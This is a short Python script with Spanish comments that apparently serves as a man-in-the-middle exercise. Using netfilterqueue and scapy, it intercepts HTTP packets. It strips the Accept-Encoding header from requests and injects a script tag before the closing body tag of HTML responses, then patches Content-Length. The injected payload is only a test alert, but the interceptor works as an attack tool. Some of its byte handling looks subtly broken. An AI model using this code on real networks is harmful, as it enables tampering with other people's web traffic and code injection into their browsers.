import netfilterqueue
import scapy.all as scapy
import optparse
import re

def getArguments():
    parser = optparse.OptionParser()
    parser.add_option('-q', '--queue-num', dest= 'queueNum', help= 'Numero del queue (Debe coincidir con el asignado en "iptables")')
    options = parser.parse_args()[0]
    return options

'''
Dentro del paquete TCP, el parámetro 'load' posee una porción de código que codifica el código html a formato gzip.
Lo que queremos hacer es borrar esa porción de código para que se muestre el html sin codificación para poder hacer la inyección de código.
Para ello, dentro de una variable almacenamos una función que elimine la cadena de texto que deseemos y nos retorne ese nuevo valor.
Una vez hecho esto, dentro de la función setload pasamos como parámetros el packete que queremos modificar y el load que queremos
    reemplazar en el que load es una cadena de texto modificada en donde se eliminó la cadena de texto que codifica el html
'''
def setLoad(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def processPacket(packet):
    scapyPacket = scapy.IP(packet.get_payload()) #Obtiene toda la información útil del paquete

    if scapyPacket.haslayer(scapy.Raw):
        load = scapyPacket[scapy.Raw].load
        try:
            if scapyPacket[scapy.TCP].dport == 80: #Cliente envía solicitud al servidor HTTP
                load = re.sub(r'Accept-Encoding:.*?\\r\\n', '', str(load)) #Busca y elimina la cadena de texto <<Accept-Encoding: gzip, deflate>>
                load = bytes(load, 'utf-8')
                
            elif scapyPacket[scapy.TCP].sport == 80: #Servidor HTTP envía respuesta al cliente
                injectionCode = b'<script>window.alert("test");</script>'
                load = load.replace(b'</body>', injectionCode + b'</body>')
                contentLengthSearch = re.search(b'(?:Content-Length:\s)(\d*)', load)

                if contentLengthSearch and b'text/html' in load:
                    contentLenght = contentLengthSearch.group(1)
                    newContentLenght = int(contentLenght) + len(injectionCode)
                    load = (load.replace(contentLenght, bytes(newContentLenght)))
        
            if load != scapyPacket[scapy.Raw].load:
                newPacket = setLoad(scapyPacket, load)
                print(newPacket.show())
                packet.set_payload(bytes(newPacket))

        except IndexError:
            pass
    
    packet.accept()

options = getArguments()
queue = netfilterqueue.NetfilterQueue()
queue.bind(int(options.queueNum), processPacket)

try:        
    queue.run()

except KeyboardInterrupt:
    print('\nPrograma finalizado')

queue.unbind()
